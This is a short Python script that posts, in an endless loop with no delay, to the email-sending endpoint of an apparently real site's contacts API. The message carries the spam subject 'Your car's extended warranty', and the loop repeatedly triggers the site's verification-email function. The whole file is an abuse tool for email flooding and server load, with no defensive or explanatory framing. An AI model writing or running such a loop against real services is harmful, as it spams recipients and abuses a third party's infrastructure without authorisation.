import requests
import json

url = "https://campustech.org/api/2.0/contacts/send/email/user"
headers = {

}
payload = {
    "subject": "Your car's extended warranty",
    "type": "verificationCodeEmailConfigs",
    "emailTo": [""],
    "fields": {"[submitter_name]": "weee"},
    "entry_id": "6048a009-143c-42cc-98be-b312c45d5e73"
}



while(True): 
  response = requests.post(url, headers=headers, data=json.dumps(payload))
  print(response.status_code)
  print(response.text)
